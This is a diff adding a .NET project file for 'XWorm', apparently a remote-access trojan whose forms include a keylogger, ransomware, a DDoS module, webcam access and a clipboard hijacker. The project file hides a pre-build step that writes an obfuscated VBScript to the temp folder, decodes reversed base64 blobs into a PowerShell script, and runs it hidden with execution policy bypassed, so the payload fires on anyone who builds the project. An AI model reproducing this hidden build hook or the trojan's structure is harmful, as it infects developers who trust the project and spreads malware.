@@ -1,0 +1,553 @@
+﻿<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>XWorm</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net45</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>11.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <Compile Remove="XWorm.VBCode.Designer.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Remove="XWorm.RemoteDesktop.resx" />
+    <EmbeddedResource Remove="XWorm.VBCode.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="FastColoredTextBox">
+      <HintPath>FastColoredTextBox.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Guna.UI2">
+      <HintPath>Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.WindowsForms">
+      <HintPath>GMap.NET.WindowsForms.dll</HintPath>
+    </Reference>
+    <Reference Include="NAudio">
+      <HintPath>NAudio.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Core" />
+    <Reference Include="SimpleObfuscator">
+      <HintPath>SimpleObfuscator.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.Core">
+      <HintPath>GMap.NET.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="IconExtractor">
+      <HintPath>IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>Newtonsoft.Json.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="XWorm.VBCode.Designer.cs">
+      <CustomToolNamespace>ResXFileCodeGenerator</CustomToolNamespace>
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.VBCode.resx</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="DotNetZip" Version="1.16.0" />
+    <PackageReference Include="System.IO.Compression" Version="4.3.0" />
+  </ItemGroup>
+  <ItemGroup>
+    <Resource Include="XWorm.RemoteDesktop.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.RemoteDesktop.Designer.cs</LastGenOutput>
+    </Resource>
+    <Resource Include="XWorm.VBCode.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <CustomToolNamespace></CustomToolNamespace>
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <LastGenOutput>XWorm.VBCode.Designer.cs</LastGenOutput>
+    </Resource>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Update="XWorm.About.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.About.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.RemoteDesktop.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.RemoteDesktop.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.VoiceChat.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.VoiceChat.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Builder.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Builder.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Chat.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Chat.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Clipboard.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Clipboard.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Clipper.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Clipper.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.CustomOpen.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.CustomOpen.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.DDosAttack.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.DDosAttack.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.EditReg.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.EditReg.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.FilesSearcher.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.FilesSearcher.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Form2.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Form2.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.HApps.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.HApps.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Hash.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Hash.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.HBrowser.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.HBrowser.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Hosts.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Hosts.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.HRDP.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.HRDP.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.INFO.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.INFO.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Keylogger.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Keylogger.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Main.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Main.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Maps.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Maps.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.MBox.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.MBox.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ngrok.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ngrok.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Performance.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Performance.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Port.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Port.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ProcessV.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ProcessV.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Programs.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Programs.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Proxy.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Proxy.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Ransomware.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Ransomware.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Registry.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Registry.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Resources.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.RunPE.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.RunPE.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ServiceManager.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ServiceManager.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Shell.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Shell.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Sound.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Sound.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.StartupManager.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.StartupManager.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.TBotNotify.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.TBotNotify.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.TcpConnectionForm.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.TcpConnectionForm.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ToolsBox.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ToolsBox.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.WebCam.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.WebCam.resx</DependentUpon>
+    </Compile>
+  </ItemGroup>
+  <Target Name="CustomStep" AfterTargets="PreBuildEvent">
+		<Exec Command="@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\a&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;JFIgPSAic0pISTcwSElsVm5icFJuYnZOVWVzUm5ibHhXYVRCaWJ2bEdkakZrY3ZKbmNGMUNJcDBXWjBOWGVUcGpPZE5YWjBWbllwSkhkMEZVWnNsbVJ1OFVTdTBXWjBOWGVUdEZJeTltWXRBaWJsUkdacGhrTzYwMWNsUlhkaWxtYzBSWFFseFdhRzV5VEo1U2JsUjNjNU4xV29BU1oxeFdZVzFDSXpWR2QxSldheVJIZEJCU1p0Rm1UdEFDWmtBQ2EwRkdVdEFTZTBKWFp3OW1jUTFXWjBsVUwwVjJVZ3NUWjE1V2EwNTJiRGxIYjA1V1pzbDJVZzQyYnBSM1lCSjNieUpYUnRBU0t0VkdkemwzVTZvVFh6VkdkMUpXYXlSSGRCVkdicFprTFBsa0x0VkdkemwzVWJCaWN2SldMZzRXWmtSV2FJcGpPZE5YWjBWbllwSkhkMEZVWnNsbVJ1OFVTdTBXWjBOWGVUdEZLZ1VXZHNGbVZ0QXljbFJYZGlsbWMwUlhRZ1VXYmg1VUxnOEdKZ2dHZGhCVkxna0hkeVZHY3ZKSFV0VkdkSjFDZGxORkk3a0NLbE4zYndOWGFFNXlZM1JDSTdreWJrQUNMMVJDS2x4V2FHUldZdnhtYjM5R1J1TTJka0F5TzA1V1pweDJRaVYyVnVRWFpPNVNibFIzYzVORkkwTldacUoyVHRjWFpPQlNQZ00yZGtBeU9pVUdlbDVpZTNJQ0lvUlhZUVJHYnBoMlF0QUNaa0FDYTBGR1V0QUNhMEZHVXQ0V2F2cEVJOUF5YmtBeU9pVUdlbDVpYzZkekxoOXlaeTltTHdsbWV0Y2pMM2QzZHY4aU96QkhkMGhtSWcwREkxUkNJN3dHYjE1VUwwVjNUZ3dISWxObWN2WlVMZ1FHSmdnR2RoQlZMZ2tuY3ZSM1lsSlhhRUJTWndsSFZ0VkdkSjFDSXRWR2RKMXlkbDVFSTdCU0twSVNaNFZtTDZkRFhrUmlJZ2dHZGhCVkwwTlhaVWhDSTA5bWJ0Z0NJbWxHSTdJQ2NwcGxibFpYWnp4VlkwRkdSdEZtY245bWNReGxPREpDSTlBQ1prQXlPOUJDZHBGMlZ0QWlibFJHWnBoRUlseFdlME4xZHZSbWJwZFZMZ2NtY2hSQ0kwTlhhTVJuYmwxV2RuSlhRdEFpZWtBQ2EwRkdVbHhXYUcxQ0l6TlhaajltY1ExQ2R5RkdkVEJ5T2lrWExnQUhKdzFDSWlBMmJrSUNZdjFDSWlBV1lrSUNZZ2duSWcwREluSlhZa0F5T2lVR2VsNWllM3dGY3BwbGJsWlhaenhWWTBGR1J0Rm1jbjltY1F4bE9ESkNJOUFpZWtBeU96UkNJcDFDSTJCU1BnQUhKZ3NqSTkwemRPUlRRcDFFZUZSVVMwTUdSSkpUVEVsa01GUlZUblZGVk9kV1FFOTBaTlJWVDRGVWFPTlRRRDVVTUJsV1R3RTBVT05UUTUxMGRGUlVTNjFFUkpOVFZFbFVNWlJVU3owRVJKZFhWRWxFTnJSVVMwMEVSSkJ6YUVsRWVWUlVTNWRHUkpCVFFVMWtJZzBESXpSQ0lwOEdKZGRtYnBKSGR6dEZJc0VHSmRkbWJwSkhkenRGS2cwV1l5RkdjZ3NISWxCaWJ2bEdkajVXZG1CeU85Qmlja0FpYnlWSGRsSkhJNzBISTRSU1gwNVdhYjFs&quot; &gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo c = &quot;Z1FISmdnR2RoQlZMdWwyYktCU1BnWUdKZ3NUS29nR2RoQkZjdFZHVjBWMlI2b1RYb1JYWVE1eVRKNVNibFIzYzVOMVdnMERJMFJDSTdrQ0tuNVdheVIzVXZSbExwZ0NacFYzUjNWbVQ2b1RYa2xXZEg1U2JsUjNjNU4xV2cwREluUkNJOUJ5WXZKSGNrQXlhdEFpY2tBU2J0MUNJa0JTUGd3R1prQXllZ2tpY2tnQ0ltbEdJN1FHSmdrbWNWMUNJazlHYTBWV1QwTlhaUzFTWnI5bWR1bEVJOUFpY2tBeU9qOTJieUJISmdzV0xnVUdKZzBXYnRBQ1pnMERJa1JDSTdCU2V5UkhJOUJpYnlWSGRsSkhJN0JTS2xSQ0kwOW1idGdDSW1sR0lwVUdKZGRtYnBKSGR6dEZLZzBXWXlGR2Nnc0hJd0JpYnZsR2RqNVdkbUJ5TzlCU2Znd21jZ3NETXlBeWNrNTJialYyVXRBQ2NsVkdiVDFDZHlGR2RUQnllZ2cyWTBGMllnMEhJaWMyU045R1JNZDBiRWRETjNselNqRkhSaUozZGg5MGN5UjBOdmQzYkxOWGJFOVNOM05uVHhkSFdQMTBhRHhVYzNaMlROSjNRcVp6ZEo5MFl4UkVWMmNYUlBOR2NEcG5OMzkwVGpKM1FZSkRiRFptTXdSa2QxYzNNTDFVY0VOamMzSkNJd0J5ZWdrbmMwQnllZzhHSXU5V2EwTm1iMVpHSTcwSEk5QnliZ3NISW9OR2RoTkdJOUJpSTlBemIzTjJUNGdHUnFGM2REOUVPcU5FVlloR1I2QjNkd3NFT3NOa2MxYzNZR1p6ZGg5MGN3TkVUeGRIUlBObWJFcFhOM1YwVGpCM1E2WnpkUDkwWXlORVd5dzJRbUpEY0VaWE4zTnpTTkZIUnpJM2RpQUNjZ3NISTVKSGRnc0hJNEJpYnZsR2RqNVdkbUJ5TzlCU2ZnZ0hJN0JDYWpSWFlqQlNmZ0lTTXdWemR6c1VUdFJrZTFjblJQaFRXNHQwY3VORVRJMTJReUIzZGpSbk4zMTBUalIzUVFGM2RGOTBjdFJrYXhkWFJQTkdjRHBuTjM5MFRqSjNRWUpEYkRabU13UmtkMWMzTUwxVWNFTmpjM0pDSXdCeWVna25jMEJ5ZWd3R0l1OVdhME5tYjFaR0k3MEhJOUJDYmdzSElvTkdkaE5HSTlCaUk5MHpaMU5FVzFjSFNQaHpiRHgwTjNOMVQ0NDJRTVp6ZFM5VVR5TjBNeGRuWVBObmFESm1OM0YxVHpSM1FRRjNkRDlFT3ZSME0xY25UTE5uYkR4a04zcDFUNEkzUVlKRGJEWm1Nd1JrZDFjM01MMVVjRU5qYzNKQ0l3QnllZ2tuYzBCeWVnd21jZzQyYnBSM1l1Vm5aIjsgJHR4dCA9ICRSLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJHR4dCk7ICRibmIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0eHQpKTsgJGV4cCA9ICJJbnZva2UtRXhwcmVzc2lvbiI7IE5ldy1BbGlhcyAtTmFtZSBwV04gLVZhbHVlICRleHAgLUZvcmNlOyBwV04gJGJuYg==&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo d = &quot;Y2hoMlliQlNQckFpY2tBeWVna3lZa0FpYnBCQ2VrZ0NJb05XWWxKM2JtQnlPaUlDSTlBaWNrQXlPbkF5SmdRWGFzQjNjdEF5Y2tBU1BnTUdKZ3NUS2lSQ0tuNVdheVIzVTBWMlJ1Z2pSVVZsTzYwMVp1bEdadk5tYkY1Q2Q0VkdWdTBXWjBOWGVUdEZJOUF5Y2tBeU9wa0dKb2NtYnBKSGRUUmpObE5YWUMxMmJ5WmtPNjBGZHlWbWR1OTJRdTBXWjBOWGVUdEZJOUFpWWtBU0twUlNYbjVXYXlSM2NiaENJdEZtY2hCSEk3QmlkZzQyYnBSM1l1Vm5aZ3NqSTl4Q0pnZDFPaEoyZStCa2I0MDBNNHdTT2lCWGNpQVNQZ00yYnlCSEpnc1RmZzBISTM5bWNvUkhJN0JDYWpSWFlqQlNmZ1FHSmc0V2F2cFdMZzRtYzFSWFp5QnlPOUJTS3dSQ0l0QXlZa2dTWHlGR2FqdEZJOUFTWHBSeVdrUkNJNzBGYTBkbWJseGtMclJDSWxBU2FrczFha0FTUGdBSEpnc1RYcFJ5V3pSQ0k5QXlZa0F5ZWdreUtya0dKZ3NEYTBkbWJseGtMelJDSTB4V0xna0dKZ3NETWcwRElwUkNLZ0kzYm1CeU9vUjNadVZHVHVNSEpnMDFXeUZHYWpCQ2RqVm1haTlVTDNWbVRnMERJa1JDSTdraVlrZ3ladWxtYzBORmRsZGtMNFlFVlZwak9kZG1icFIyYmo1V1J1UUhlbFJsTHRWR2R6bDNVYkJTUGdNSEpnc1RLdDFHSm9jbWJwSkhkVFJqTmxOWFlDMTJieVprTzYwRmR5Vm1kdTkyUXUwV1owTlhlVHRGSTlBaVlrQXllZ2tuYzBCU0tyUlNYbjVXYXlSM2NiQkNMdDFHSmRkbWJwSkhkenRGS2cwV1l5RkdjZ3NISWtCaWJ2bEdkajVXZG1CeU9pUW5lZkZUZXQxak5vMUNkck5FZFZKQ0k5QXlZdjltY3dSQ0k3MEhJOUJ5ZHZKSGEwQnllZ2cyWTBGMllnMEhJOUJTZmdZR0pnMFdaMGxVTGxaM2J0Vm1VZ3NISXBZR0pnZ0dkaEJWTDBOWFpVaENJbWxHSTlCaWJsUkdacGhFSWx4V2UwTjFkdlJtYnBkVkxnWUVlbFJDSW9SWFlRVkdicFpVTGdNM2NsTjJieUJWTDBKWFkwTkZJN0JTS0doWFprQUNhMEZHVXRRM2NsUkZLZ1lXYWdzaklsaFhadUlYWjB4V2FHaDJZeUZXWlRKQ0k0VkdKZ2dHZGhCVkx1bDJiS0JTUGdZRWVsUkNJN2dYWmtBeWJ0QWlaa0FTWXRBU1pnc1RLaVJDSXNZR0pvTVhaMGxuUXN4V1FsUlhheWRsTzYwVlpzbG1SdThVU3UwV1owTlhlVHRGSTdCU0t3QUNkbjFDSW9SM1p1VkdUdUlHSm9BaVpwQnlPcHdHWmtnU1kwRkdSa0YyYnM1MmR2UmtMalJDSTlBaVlrQXlPMDVXWnB4MlFpVjJWdVFYWk81U2JsUjNjNU5GSTBOV1pxSjJUdGNYWk9CU1BnTUdKZ3NUS3BneVp1bG1jME4xYlU1U0tvUVdhMWQwZGw1a082MEZacFYzUnUwV1owTlhlVHRGS2dRSEpnZ0dkaEJWTHVsMmJLQlNQZ2dYWmtBeU9wSWllMzRpSWdzQ0luUkNL&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\i.ps1&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\b.vbs&quot;&#xD;&#xA;endlocal" />
+	</Target>
+  <ItemGroup>
+    <EmbeddedResource Update="XWorm.Abouts.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Abouts.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.VoiceChat.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.VoiceChat.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.About.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.About.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ACT.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Builder.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Builder.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Chat.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Chat.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Clipboard.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Clipboard.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Clipper.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Clipper.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.CustomOpen.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.CustomOpen.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.DDosAttack.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.DDosAttack.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.EditReg.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.EditReg.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.FilesSearcher.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.FilesSearcher.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.FM.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Form2.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Form2.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Ftp.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Fun.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.HApps.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
